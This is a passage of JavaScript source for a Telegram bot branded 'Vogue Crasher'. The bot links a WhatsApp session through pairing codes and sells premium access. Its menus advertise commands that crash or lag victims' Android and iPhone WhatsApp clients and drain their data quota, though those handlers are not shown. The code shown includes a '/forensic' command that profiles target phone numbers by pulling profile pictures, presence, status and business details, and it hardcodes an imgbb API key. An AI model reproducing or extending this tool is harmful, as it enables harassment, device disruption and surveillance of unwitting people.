            "You already used free premium permanently.", { show_alert: true }
        );
    }
    
    try {
        // 🔥 safety check channel format
        if (!requiredChannel.startsWith('@')) {
            throw new Error("Invalid channel format. Must be @username");
        }
        
        const member = await ctx.telegram.getChatMember(requiredChannel, userId);
        
        if (!member || member.status === "left" || member.status === "kicked") {
            return ctx.answerCbQuery("Join channel first.", { show_alert: true });
        }
        
        const expiry = addPremiumUser(userId, 1);
        
        markClaimedFreePremium(userId);
        
        return ctx.editMessageCaption(
            `\`\`\`ruby
V O G U E  •  C R A S H E R
──────────────────────────

FREE PREMIUM GRANTED

User     : ${ctx.from.first_name}
Status   : ACTIVE (1 DAY)
Expiry   : ${moment(expiry).format("DD-MM-YYYY HH:mm")}

──────────────────────────
One-time reward activated.
\`\`\``, { parse_mode: "markdown" });
        
    } catch (err) {
        console.log("CHECK PREMIUM ERROR:", err);
        
        // kasih error spesifik biar gampang debug
        return ctx.answerCbQuery(
            "Failed to verify channel membership.", { show_alert: true }
        );
    }
});

bot.action('/controls', async (ctx) => {
    const controlsMenu = `\`\`\`javascript
V O G U E  •  C R A S H E R  
──────────────────────────
User        : ${ctx.from.first_name}
Developer   : @PrinceXVogue
Version     : 1.2 Stable
Prefix      : /
──────────────────────────

O W N E R • M A N A G E
› /reqpair
› /killsession
› /info
› /restartbot
› /update
› /ping


──────────────────────────

P R E M I U M • A C C E S S
› /addprem
› /delprem
› /listprem
› /addgrup
› /delgrup

──────────────────────────

T O O L S • M E N U
› /tourl
› /sticker
› /forensic

──────────────────────────

S T A T U S
› All services are operational
› Dispatch engine is active

\`\`\``;
    
    const keyboard = [
        [
            {
                text: "Back To Menu",
                callback_data: "/start"
            }
        ]
    ];
    
    try {
        
        await ctx.editMessageCaption(
            controlsMenu,
            {
                parse_mode: "markdown",
                reply_markup: {
                    inline_keyboard: keyboard
                }
            }
        );
        
    } catch (error) {
        
        try {
            await ctx.answerCbQuery();
        } catch {}
        
    }
    
});

bot.action('/bug', async (ctx) => {
    const bugMenu = `\`\`\`javascript
V O G U E • C R A S H E R
────────────────────────
User   : ${ctx.from.first_name}
Dev    : @PrinceXVogue
Ver    : 1.2 Stable
Prefix : /
────────────────────────

A N D R O I D
› /spamandro    → Hard Delay Invisible
› /hardspam     → Very Hard Delay Invisible
› /drainet      → Increase Quota Usage


I P H O N E
› /spamiphone   → iOS Crash Invisible

\`\`\``;
    
    const keyboard = [
        [
            {
                text: "Back",
                callback_data: "/start"
            }
        ]
    ];
    
    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Bad Request: message is not modified") {
            await ctx.answerCbQuery();
        } else {}
    }
});

bot.action('/tqto', async (ctx) => {
    const tqtoMenu = `
\`\`\`javascript
V O G U E  •  C R A S H E R
──────────────────────────

ACKNOWLEDGEMENT PANEL

User        : ${ctx.from.first_name}
Developer   : @PrinceXVogue
Version     : 1.2 Stable
Prefix      : /

──────────────────────────

Support Team
@PrinceXVogue
@PrinceXVogue

──────────────────────────
Official Build by VOGUE CRASHER
\`\`\``;
    
    const keyboard = [
        [
            {
                text: "Return to Main Menu",
                callback_data: "/start"
            }
        ]
    ];
    
    try {
        
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
        
    } catch (error) {
        
        if (
            error.response &&
            error.response.error_code === 400 &&
            error.response.description === "Bad Request: message is not modified"
        ) {
            
            await ctx.answerCbQuery();
            
            console.log(
                "[VOGUE CRASHER] Message update skipped because the content is identical."
            );
            
        } else {
            
            console.log(
                "[VOGUE CRASHER] Failed to update acknowledgement panel."
            );
            
        }
    }
});

//     _____ _____ _   _______ ___________            
//    /  ___|  ___| \ | |  _  \  ___| ___ \           
//    \ `--.| |__ |  \| | | | | |__ | |_/ /           
//     `--. \  __|| . ` | | | |  __||    /            
//    /\__/ / |___| |\  | |/ /| |___| |\ \            
//    \____/\____/\_| \_/___/ \____/\_| \_|           
//                                                    
//                                                    
//     _____ ________  ______  ___  ___   _   _______ 
//    /  __ \  _  |  \/  ||  \/  | / _ \ | \ | |  _  \
//    | /  \/ | | | .  . || .  . |/ /_\ \|  \| | | | |
//    | |   | | | | |\/| || |\/| ||  _  || . ` | | | |
//    | \__/\ \_/ / |  | || |  | || | | || |\  | |/ / 
//     \____/\___/\_|  |_/\_|  |_/\_| |_/\_| \_/___/  
//                                                    
//                                                    

bot.command("reqpair", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ")[1];
    if (!args) return ctx.reply("🪧 ☇ Format: /reqpair 62×××");
    
    const phoneNumber = args.replace(/[^0-9]/g, "");
    if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");
    
    try {
        if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
        if (sock.authState.creds.registered) {
            return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
        }
        
        let customcode = "XXVOGUEX"
        const code = await sock.requestPairingCode(phoneNumber, customcode);
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
        
        const pairingMenu = `
\`\`\`ruby
VOGUE CRASH • PAIRING SYSTEM
──────────────────────────── 

Welcome, ${ctx.from.first_name}

This system is connected to the
Trash Matrix WhatsApp engine.

Session Information

Developer     : @PrinceXVogue
Version       : 1.2 Stable
Prefix        : /

────────────────────────────

Target Number
${phoneNumber}

Pairing Code
${formattedCode}

Connection Status
Waiting for Authentication

──────────────────────────────
Open WhatsApp Linked Devices and
enter the pairing code above to
complete the authorization process.
\`\`\``;
        
        const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {
            caption: pairingMenu,
            parse_mode: "markdown"
        });
        
        lastPairingMessage = {
            chatId: ctx.chat.id,
            messageId: sentMsg.message_id,
            phoneNumber,
            pairingCode: formattedCode
        };
        
    } catch (err) {
        console.error(err);
    }
});

if (sock) {
    sock.ev.on("connection.update", async (update) => {
        if (update.connection === "open" && lastPairingMessage) {
            const updateConnectionMenu = `
\`\`\`ruby
VOGUE CRASH • CONNECTION STATUS
──────────────────────────────

WhatsApp session has been successfully
authenticated and is now operational.

System Information

Developer     : @PrinceXVogue
Version       : 1.2 Stable
Prefix        : /

──────────────────────────────

Registered Number
${lastPairingMessage.phoneNumber}

Pairing Code
${lastPairingMessage.pairingCode}

Connection Status
Connected Successfully

──────────────────────────────
The sender session is active and ready
for command execution.
\`\`\``;
            
            try {
                await bot.telegram.editMessageCaption(
                    lastPairingMessage.chatId,
                    lastPairingMessage.messageId,
                    undefined,
                    updateConnectionMenu, { parse_mode: "markdown" }
                );
            } catch (e) {}
        }
    });
}

//    ______ _____ _   _ _____ _     ___________ ___________ 
//    |  _  \  ___| | | |  ___| |   |  _  | ___ \  ___| ___ \
//    | | | | |__ | | | | |__ | |   | | | | |_/ / |__ | |_/ /
//    | | | |  __|| | | |  __|| |   | | | |  __/|  __||    / 
//    | |/ /| |___\ \_/ / |___| |___\ \_/ / |   | |___| |\ \ 
//    |___/ \____/ \___/\____/\_____/\___/\_|   \____/\_| \_|
//                                                           
//                                                           
//     _____ ________  ______  ___  ___   _   _______        
//    /  __ \  _  |  \/  ||  \/  | / _ \ | \ | |  _  \       
//    | /  \/ | | | .  . || .  . |/ /_\ \|  \| | | | |       
//    | |   | | | | |\/| || |\/| ||  _  || . ` | | | |       
//    | \__/\ \_/ / |  | || |  | || | | || |\  | |/ /        
//     \____/\___/\_|  |_/\_|  |_/\_| |_/\_| \_/___/         
//                                                           
//                                                           

let maintenanceMode = false;

const maintenanceMessage = `
\`\`\`ruby
V O G U E  •  C R A S H E R
──────────────────────────

SYSTEM MAINTENANCE

Status      : Unavailable
Engine      : Updating
Access      : Restricted

──────────────────────────
The system is currently under maintenance.

Please wait until the maintenance
process has been completed.
\`\`\``;


bot.use(async (ctx, next) => {
    
    if (ctx.from?.id == ownerID) {
        return next();
    }
    
    if (maintenanceMode) {
        
        if (ctx.callbackQuery) {
            return ctx.answerCbQuery(
                "System under maintenance.",
                {
                    show_alert: true
                }
            );
        }
        
        return ctx.replyWithPhoto(
            thumbnailUrl,
            {
                caption: maintenanceMessage,
                parse_mode: "markdown",
                
                reply_markup: {
                    inline_keyboard: [
                        [
                        {
                            text: "Developer",
                            url: "https://t.me/ScriptKits",
                            style: "danger"
                        }],
                        [
                        {
                            text: "System Status",
                            callback_data: "maintenance_status",
                            style: "danger"
                        }]
                    ]
                }
            }
        );
    }
    
    return next();
});

bot.action(
    "maintenance_status",
    async (ctx) => {
        
        return ctx.answerCbQuery(
            "Maintenance currently active.",
            {
                show_alert: true
            }
        );
    }
);

bot.command(
    "maintenance",
    async (ctx) => {
        
        if (ctx.from.id != ownerID) {
            return;
        }
        
        maintenanceMode = true;
        
        return ctx.reply(
            `\`\`\`ruby
V O G U E  •  C R A S H E R
──────────────────────────

MAINTENANCE ENABLED

Status      : Active
Access      : Owner Only

──────────────────────────
Public access has been disabled.
\`\`\``,
            {
                parse_mode: "markdown"
            }
        );
    }
);

bot.command(
    "unmaintenance",
    async (ctx) => {
        
        if (ctx.from.id != ownerID) {
            return;
        }
        
        maintenanceMode = false;
        
        return ctx.reply(
            `\`\`\`ruby
V O G U E  •  C R A S H E R
──────────────────────────

MAINTENANCE DISABLED

Status      : Online
Access      : Public Restored

──────────────────────────
System access has been restored.
\`\`\``,
            {
                parse_mode: "markdown"
            }
        );
    }
);

bot.command(
    "setcd",
    async (ctx) => {

        if (
            String(ctx.from.id) !==
            String(ownerID)
        ) {

            return ctx.reply(
`\`\`\`ruby
ACCESS DENIED

Owner authorization required
\`\`\``,
{
    parse_mode: "Markdown"
}
            );
        }

        const seconds =
            parseInt(
                ctx.message.text
                .split(" ")[1]
            );

        if (isNaN(seconds)) {

            return ctx.reply(
`\`\`\`ruby
/setcd <seconds>

Example:
/setcd 15
\`\`\``,
{
    parse_mode: "Markdown"
}
            );
        }

        globalCooldown =
            seconds;

        return ctx.reply(
`\`\`\`ruby
GLOBAL COOLDOWN UPDATED

Duration : ${seconds}s
Status   : Active
\`\`\``,
{
    parse_mode: "Markdown"
}
        );
    }
);

//    ____________ ________  ________ _   ____  ___   
//    | ___ \ ___ \  ___|  \/  |_   _| | | |  \/  |   
//    | |_/ / |_/ / |__ | .  . | | | | | | | .  . |   
//    |  __/|    /|  __|| |\/| | | | | | | | |\/| |   
//    | |   | |\ \| |___| |  | |_| |_| |_| | |  | |   
//    \_|   \_| \_\____/\_|  |_/\___/ \___/\_|  |_/   
//                                                    
//                                                    
//     _____ ________  ______  ___  ___   _   _______ 
//    /  __ \  _  |  \/  ||  \/  | / _ \ | \ | |  _  \
//    | /  \/ | | | .  . || .  . |/ /_\ \|  \| | | | |
//    | |   | | | | |\/| || |\/| ||  _  || . ` | | | |
//    | \__/\ \_/ / |  | || |  | || | | || |\  | |/ / 
//     \____/\___/\_|  |_/\_|  |_/\_| |_/\_| \_/___/  
//                                                    
//                                                    

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem [user_id] [duration_in_days]");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka (dalam hari)");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('listprem', async (ctx) => {
    
    if (ctx.from.id != ownerID) {
        return ctx.reply(
            `Access Denied

This command is restricted to the system owner.`
        );
    }
    
    const premiumUsers = loadPremiumUsers();
    
    const userIds = Object.keys(premiumUsers);
    
    if (userIds.length === 0) {
        return ctx.reply(
            `\`\`\`ruby
┏━ V O G U E • P R E M I U M • L I S T ━┓

No premium users are currently registered.

┗━ System returned empty result ━┛
\`\`\``,
            {
                parse_mode: "markdown"
            }
        );
    }
    
    let text = "";
    let no = 1;
    
    for (const id of userIds) {
        
        const expiry = premiumUsers[id];
        
        const expired =
            moment(expiry, 'DD-MM-YYYY')
            .isBefore(moment());
        
        text += `
${no}. USER INFORMATION

› User ID
  ${id}
› Access Status
  ${expired ? "Expired" : "Active"}
› Expiration Date
  ${expiry}

────────────────────────────
`;
        
        no++;
    }
    
    const result = `
\`\`\`ruby
┏━ V O G U E • P R E M I U M • L I S T ━┓

⌬ REGISTERED PREMIUM USERS

Total Users : ${userIds.length}

────────────────────────────
${text}
┗━ End Of Premium Directory ━┛
\`\`\``;
    
    if (result.length > 1024) {
        return ctx.reply(
            result,
            {
                parse_mode: "markdown"
            }
        );
    }
    
    ctx.replyWithPhoto(thumbnailUrl, {
        caption: result,
        parse_mode: "markdown"
    });
    
});

bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem [user_id]");
    }
    const userId = args[1];
    removePremiumUser(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgrup', async (ctx) => {
    
    if (ctx.from.id != ownerID) {
        return ctx.reply(
            `Access Denied

This command is restricted to the system owner.`
        );
    }
    
    if (
        ctx.chat.type !== 'group' &&
        ctx.chat.type !== 'supergroup'
    ) {
        return ctx.reply(
            `Invalid Context

This command can only be used inside a group.`
        );
    }
    
    const chatId = ctx.chat.id.toString();
    
    let groups = loadPremiumGroups();
    
    if (groups.includes(chatId)) {
        return ctx.reply(
            `Premium Group Already Registered

This group already has premium access enabled.`
        );
    }
    
    groups.push(chatId);
    
    savePremiumGroups(groups);
    
    ctx.reply(
        `\`\`\`ruby
┏━ V O G U E • P R E M I U M • G R O U P ━┓

Premium access has been successfully
enabled for this group.

› Group ID
  ${chatId}
› Status
  Active

All members inside this group can now
access premium commands.

┗━ Access authorization completed ━┛
\`\`\``,
        {
            parse_mode: "markdown"
        }
    );
    
});

bot.command('delgrup', async (ctx) => {
    
    if (ctx.from.id != ownerID) {
        return ctx.reply(
            `Access Denied

This command is restricted to the system owner.`
        );
    }
    
    const chatId = ctx.chat.id.toString();
    
    let groups = loadPremiumGroups();
    
    if (!groups.includes(chatId)) {
        return ctx.reply(
            `Premium Group Not Found

This group is not registered as premium.`
        );
    }
    
    groups = groups.filter(
        id => id !== chatId
    );
    
    savePremiumGroups(groups);
    
    ctx.reply(
        `\`\`\`ruby
┏━ V O G U E • P R E M I U M • G R O U P ━┓

Premium access has been revoked
from this group.

› Group ID
  ${chatId}

› Status
  Removed

┗━ Access revocation completed ━┛
\`\`\``,
        {
            parse_mode: "markdown"
        }
    );
    
});

//     _____ _____  _____ _      _____                
//    |_   _|  _  ||  _  | |    /  ___|               
//      | | | | | || | | | |    \ `--.                
//      | | | | | || | | | |     `--. \               
//      | | \ \_/ /\ \_/ / |____/\__/ /               
//      \_/  \___/  \___/\_____/\____/                
//                                                    
//               TOOLS COMMAND                                     
//     _____ ________  ______  ___  ___   _   _______ 
//    /  __ \  _  |  \/  ||  \/  | / _ \ | \ | |  _  \
//    | /  \/ | | | .  . || .  . |/ /_\ \|  \| | | | |
//    | |   | | | | |\/| || |\/| ||  _  || . ` | | | |
//    | \__/\ \_/ / |  | || |  | || | | || |\  | |/ / 
//     \____/\___/\_|  |_/\_|  |_/\_| |_/\_| \_/___/  
//                                                    
//

// ========================================
// READ VIEW ONCE
// ========================================

bot.command("cektele", async (ctx) => {
        try {

            let input =
                ctx.message.text
                .split(" ")[1];

            let targetUser =
                null;

            if (
                ctx.message.reply_to_message
            ) {

                const reply =
                    ctx.message.reply_to_message;

                if (
                    reply.forward_from
                ) {

                    targetUser =
                        reply.forward_from;

                } else if (
                    reply.from
                ) {

                    targetUser =
                        reply.from;
                }
            }

            if (
                !targetUser &&
                input
            ) {

                // USER ID
                if (
                    /^[0-9]+$/.test(input)
                ) {

                    try {

                        const chat =
                            await ctx.telegram.getChat(
                                input
                            );

                        targetUser =
                            chat;

                    } catch {}
                }

                // USERNAME
                else if (
                    input.startsWith("@")
                ) {

                    try {

                        const chat =
                            await ctx.telegram.getChat(
                                input
                            );

                        targetUser =
                            chat;

                    } catch {}
                }
            }

            if (
                !targetUser
            ) {

                return ctx.reply(
`❖ INVALID TARGET

\`\`\`ruby
Usage:
/cektele <userid>
/cektele @username
/reply forwarded user

Example:
/cektele 598xxxxxx
/cektele @username
\`\`\``,
{
    parse_mode: "Markdown"
}
                );
            }

            const userId =
                targetUser.id ||
                "Unknown";

            const firstName =
                targetUser.first_name ||
                "Hidden";

            const lastName =
                targetUser.last_name ||
                "-";

            const fullName =
                `${firstName} ${lastName}`
                .trim();

            const username =
                targetUser.username
                ? `@${targetUser.username}`
                : "Unavailable";

            const isBot =
                targetUser.is_bot
                ? "Yes"
                : "No";

            const isPremium =
                targetUser.is_premium
                ? "Yes"
                : "No";

            const language =
                targetUser.language_code ||
                "Unknown";

            const dcId =
                targetUser.dc_id ||
                "Unknown";

            const scam =
                targetUser.is_scam
                ? "Detected"
                : "Clean";

            const fake =
                targetUser.is_fake
                ? "Detected"
                : "Clean";

            const verified =
                targetUser.is_verified
                ? "Verified"
                : "No";

            let photo =
                null;

            try {

                const photos =
                    await ctx.telegram.getUserProfilePhotos(
                        userId,
                        0,
                        1
                    );

                if (
                    photos.total_count > 0
                ) {

                    const fileId =
                        photos.photos[0][0]
                        .file_id;

                    photo =
                        await ctx.telegram.getFileLink(
                            fileId
                        );
                }

            } catch {}

            let accountType =
                "User";

            if (
                targetUser.type
            ) {

                accountType =
                    targetUser.type;
            }

            const caption =
`\`\`\`ruby
V O G U E • C R A S H E R
──────────────────────────

F O R E N S I C • R E P O R T

User ID      : ${userId}
Username     : ${username}
Display Name : ${fullName}

Account Type : ${accountType}
Bot Account  : ${isBot}
Premium User : ${isPremium}
Verified     : ${verified}

Language     : ${language}
Data Center  : ${dcId}

Scam Status  : ${scam}
Fake Status  : ${fake}

──────────────────────────
Engine       : Vogue Forensic
Status       : Live Detection
\`\`\``;

            if (photo) {

                return ctx.replyWithPhoto(
                    photo.href,
                    {
                        caption,
                        parse_mode:
                            "Markdown"
                    }
                );
            }

            return ctx.reply(
                caption,
                {
                    parse_mode:
                        "Markdown"
                }
            );

        } catch (err) {

            return ctx.reply(
`\`\`\`ruby
TELEGRAM FORENSIC FAILURE

${err.message}
\`\`\``,
{
    parse_mode: "Markdown"
}
            );
        }
    }
);

bot.command("forensic", checkWhatsAppConnection, async (ctx) => {

        try {

            const q =
                ctx.message.text
                .split(" ")[1];

            if (!q) {

                return ctx.reply(
`❖ INVALID FORMAT

\`\`\`ruby
/forensic 628xxxxxxxx
\`\`\``,
{
    parse_mode: "Markdown"
}
                );
            }

            const clean =
                q.replace(
                    /[^0-9]/g,
                    ""
                );

            const jid =
                clean +
                "@s.whatsapp.net";

            // ========================================
            // CHECK REGISTERED
            // ========================================

            const check =
                await sock.onWhatsApp(
                    jid
                );

            const registered =
                check?.[0]?.exists ||
                false;

            if (!registered) {

                return ctx.reply(
`\`\`\`ruby
FORENSIC ANALYZER

Target      : ${clean}
Status      : Not Registered

Engine      : Vogue Forensic
\`\`\``,
{
    parse_mode: "Markdown"
}
                );
            }

            // ========================================
            // PROFILE PICTURE
            // ========================================

            let profile =
                "Unavailable";

            let ppUrl =
                null;

            try {

                ppUrl =
                    await sock.profilePictureUrl(
                        jid,
                        "image"
                    );

                if (ppUrl)
                    profile =
                        "Available";

            } catch {}

            // ========================================
            // BUSINESS CHECK
            // ========================================

            let business =
                "Personal";

            try {

                const biz =
                    await sock.getBusinessProfile(
                        jid
                    );

                if (biz)
                    business =
                        "Business";

            } catch {}

            // ========================================
            // STATUS PRIVACY
            // ========================================

            let privacy =
                "Open";

            try {

                await sock.fetchStatus(
                    jid
                );

            } catch {

                privacy =
                    "Restricted";
            }

            // ========================================
            // DEVICE INDICATOR
            // ========================================

            let device =
                "Unknown";

            try {

                const deviceData =
                    check?.[0];

                if (
                    deviceData?.jid
                ) {

                    device =
                        "Mobile";
                }

            } catch {}

            // ========================================
            // PROFILE INFO
            // ========================================
            
            let displayName = null;
            let username = null;
            let about = null;
            let lastUpdate = null;
            
            // ========================================
            // REALTIME PRESENCE SYNC
            // ========================================
            
            try {
            
                await sock.presenceSubscribe(
                    jid
                );
            
                await new Promise(
                    resolve =>
                        setTimeout(
                            resolve,
                            2000
                        )
                );
            
            } catch {}
            
            // ========================================
            // USYNC QUERY
            // ========================================
            
            try {
            
                const result =
                    await sock.user?.query({
                        tag: "iq",
                        attrs: {
                            to: "@s.whatsapp.net",
                            type: "get",
                            xmlns: "usync"
                        },
                        content: [
                            {
                                tag: "usync",
                                attrs: {
                                    mode: "query",
                                    context: "interactive"
                                },
                                content: [
                                    {
                                        tag: "query",
                                        attrs: {},
                                        content: [
                                            {
                                                tag: "contact",
                                                attrs: {}
                                            },
                                            {
                                                tag: "status",
                                                attrs: {}
                                            }
                                        ]
                                    },
                                    {
                                        tag: "list",
                                        attrs: {},
                                        content: [
                                            {
                                                tag: "user",
                                                attrs: {
                                                    jid
                                                }
                                            }
                                        ]
                                    }
                                ]
                            }
                        ]
                    });
            
                const user =
                    result?.content?.[0]
                    ?.content?.[1]
                    ?.content?.[0];
            
                const contact =
                    user?.content?.find(
                        x => x.tag === "contact"
                    );
            
                const status =
                    user?.content?.find(
                        x => x.tag === "status"
                    );
            
                if (
                    contact?.attrs?.name
                ) {
            
                    displayName =
                        contact.attrs.name;
                }
            
                if (
                    status?.content
                ) {
            
                    about =
                        status.content.toString();
                }
            
            } catch {}
            
            // ========================================
            // FALLBACK CONTACT CACHE
            // ========================================
            
            try {
            
                const c =
                    sock.contacts?.[jid];
            
                if (
                    !displayName
                ) {
            
                    displayName =
                        c?.name ||
                        c?.notify ||
                        c?.verifiedName ||
                        c?.pushname;
                }
            
            } catch {}
            
            // ========================================
            // BUSINESS PROFILE
            // ========================================
            
            try {
            
                const biz =
                    await sock.getBusinessProfile(
                        jid
                    );
            
                if (
                    biz?.description &&
                    !about
                ) {
            
                    about =
                        biz.description;
                }
            
                if (
                    biz?.categories?.length
                ) {
            
                    business =
                        "Business";
                }
            
            } catch {}
            
            // ========================================
            // STATUS FETCH
            // ========================================
            
            try {
            
                const s =
                    await sock.fetchStatus(
                        jid
                    );
            
                if (
                    s?.status &&
                    !about
                ) {
            
                    about =
                        s.status;
                }
            
                if (
                    s?.setAt
                ) {
            
                    lastUpdate =
                        moment(
                            s.setAt
                        )
                        .tz(
                            "Asia/Jakarta"
                        )
                        .format(
                            "DD/MM/YYYY HH:mm:ss"
                        );
                }
            
            } catch {}
            
            // ========================================
            // FINAL FALLBACK
            // ========================================
            
            if (!displayName)
                displayName = "Private";
            
            if (!about)
                about = "Private";
            
            username =
                displayName
                .toLowerCase()
                .replace(/[^a-z0-9]/g, "_")
                .replace(/_+/g, "_")
                .replace(/^_+|_+$/g, "");

            // ========================================
            // OUTPUT
            // ========================================

            const caption =
    `\`\`\`ruby
V O G U E • C R A S H E R
════════════════════════
F O R E N S I C • R E P O R T

I N F O R M A T I O N
Number      : ${clean}
Account     : Registered
Display     : ${displayName}
Username    : ${username}

A C C O U N T
Category    : ${business}
Profile     : ${profile}
Privacy     : ${privacy}
Device      : ${device}

I D E N T I T Y
Biography   : ${about}
Updated     : ${lastUpdate}

════════════════════════
Engine      : Vogue Forensic Engine
Status      : Active
════════════════════════
\`\`\``;

            if (ppUrl) {

                return ctx.replyWithPhoto(
                    ppUrl,
                    {
                        caption,
                        parse_mode:
                            "Markdown"
                    }
                );
            }

            return ctx.reply(
                caption,
                {
                    parse_mode:
                        "Markdown"
                }
            );

        } catch (err) {

            return ctx.reply(
`\`\`\`ruby
FORENSIC FAILURE

${err.message}
\`\`\``,
{
    parse_mode: "Markdown"
}
            );
        }
    });

bot.command("sticker", async (ctx) => {
    
    try {
        
        const reply =
            ctx.message.reply_to_message;
        
        if (
            !reply ||
            (
                !reply.photo &&
                !reply.document &&
                !reply.video &&
                !reply.animation
            )
        ) {
            
            return ctx.reply(
                `Invalid Format

Reply image / gif / video with:
/sticker`
            );
        }
        
        const loading = await ctx.replyWithPhoto(
            thumbnailUrl,
            {
                caption: `
\`\`\`ruby
V O G U E • STICKER ENGINE
──────────────────────────

Status      : Processing

──────────────────────────
Converting media to sticker...
\`\`\`
`,
                parse_mode: "markdown"
            }
        );
        
        let fileId;
        let isVideo = false;
        
        if (reply.photo) {
            
            fileId =
                reply.photo[
                    reply.photo.length - 1
                ].file_id;
        }
        
        else if (reply.document) {
            
            fileId =
                reply.document.file_id;
            
            if (
                reply.document.mime_type?.includes("video")
            ) {
                isVideo = true;
            }
        }
        
        else if (reply.video) {
            
            fileId =
                reply.video.file_id;
            
            isVideo = true;
        }
        
        else if (reply.animation) {
            
            fileId =
                reply.animation.file_id;
            
            isVideo = true;
        }
        
        const file =
            await ctx.telegram.getFile(fileId);
        
        const fileUrl =
            `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
        
        const response =
            await axios.get(
                fileUrl,
                {
                    responseType: "arraybuffer"
                }
            );
        
        const buffer =
            Buffer.from(response.data);
        
        if (isVideo) {
            
            await ctx.replyWithSticker(
            {
                source: buffer
            });
            
        } else {
            
            await ctx.replyWithSticker(
            {
                source: buffer
            });
        }
        
        await ctx.telegram.deleteMessage(
            ctx.chat.id,
            loading.message_id
        );
        
    } catch (err) {
        
        console.log(err);
        
        return ctx.replyWithPhoto(
            thumbnailUrl,
            {
                caption: `
\`\`\`ruby
V O G U E • STICKER ENGINE
──────────────────────────

Status      : Failed

──────────────────────────
Unable to convert media
to sticker format.
\`\`\`
`,
                parse_mode: "markdown"
            }
        );
    }
});

bot.command("tourl", async (ctx) => {
    
    try {
        const apiKey =
            "8f2a09515256735774c3d906b6c997f9";
        
        const reply =
            ctx.message.reply_to_message;
        
        if (
            !reply ||
            (
                !reply.photo &&
                !reply.document &&
                !reply.sticker
            )
        ) {
            
            return ctx.reply(
                `Reply image/sticker/document

Usage:
/tourl`
            );
        }
        
        let fileId;
        
        if (reply.photo) {
            
            fileId =
                reply.photo[
                    reply.photo.length - 1
                ].file_id;
        }
        
        else if (reply.document) {
            
            fileId =
                reply.document.file_id;
        }
        
        else if (reply.sticker) {
            
            fileId =
                reply.sticker.file_id;
        }
        
        const loading =
            await ctx.replyWithPhoto(
                thumbnailUrl,
                {
                    caption: `
\`\`\`ruby
V O G U E • TO URL
────────────────────────

Status
Uploading media...

Please wait.
\`\`\`
`,
                    parse_mode: "markdown"
                }
            );
        
        const file =
            await ctx.telegram.getFile(fileId);
        
        const fileUrl =
            `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
        
        const response =
            await axios.get(fileUrl, {
                responseType: "arraybuffer"
            });
        
        const buffer =
            Buffer.from(response.data);
        
        const form =
            new FormData();
        
        form.append(
            "image",
            buffer.toString("base64")
        );
        
        const upload =
            await axios.post(
                `https://api.imgbb.com/1/upload?key=${apiKey}`,
                form,
                {
                    headers: form.getHeaders()
                }
            );
        
        const result =
            upload.data;
        
        if (!result.success) {
            
            return ctx.reply(
                "Upload failed."
            );
        }
        
        const data =
            result.data;
        
        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            loading.message_id,
            undefined,
            
            `
\`\`\`ruby
V O G U E • TO URL
────────────────────────

Upload Status
Success

Image Information

File Name
${data.image.filename}

Size
${data.size} bytes

Resolution
${data.width}x${data.height}

────────────────────────

Direct URL
${data.url}

Viewer URL
${data.url_viewer}
\`\`\`
`,
            {
                parse_mode: "markdown",
                
                reply_markup: {
                    inline_keyboard: [
                        [
                        {
                            text: "Open Image",
                            url: data.url,
                            style: "primary"
                        }],
                        [
                        {
                            text: "Viewer Link",
                            url: data.url_viewer,
                            style: "success"
                        }]
                    ]
                }
            }
        );
        
    } catch (err) {
        
        console.log(err);
        
        return ctx.reply(
            "Failed to upload media."
        );
    }
});

bot.command("update", async (ctx) => {
    
    if (ctx.from.id != ownerID) {
        return ctx.reply(
            `Access Denied

This command is restricted to the system owner.`
        );
    }
    
    const { exec } = require("child_process");
    
    const msg = await ctx.reply(
        `\`\`\`ruby
V O G U E  •  U P D A T E
──────────────────────────

Checking repository...
Fetching latest commit...
Preparing update process...

Status : RUNNING
\`\`\``, { parse_mode: "markdown" }
    );
    
    exec("git pull", async (error, stdout, stderr) => {
        
        if (error) {
            return ctx.telegram.editMessageText(
                ctx.chat.id,
                msg.message_id,
                null,
                `\`\`\`ruby
V O G U E  •  U P D A T E
──────────────────────────

Update Failed

${error.message}
\`\`\``, { parse_mode: "markdown" }
            );
        }
        
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            msg.message_id,
            null,
            `\`\`\`ruby
V O G U E  •  U P D A T E
──────────────────────────

Repository updated successfully

${stdout}
\`\`\``, { parse_mode: "markdown" }
        );
        
        process.exit(0);
        
    });
    
});

bot.command('restartbot', async (ctx) => {
    
    if (ctx.from.id != ownerID) {
        return ctx.reply(
            `Access Denied

This command is restricted to the system owner.`
        );
    }
    
    const msg = await ctx.reply(
        `\`\`\`ruby
V O G U E  •  S Y S T E M
──────────────────────────

RESTART OPERATION

Status      : Initializing
Engine      : Restart Sequence
Process     : Rebuilding Runtime

──────────────────────────
The bot system is preparing for restart execution.
\`\`\``,
        {
            parse_mode: "markdown"
        }
    );
    
    setTimeout(async () => {
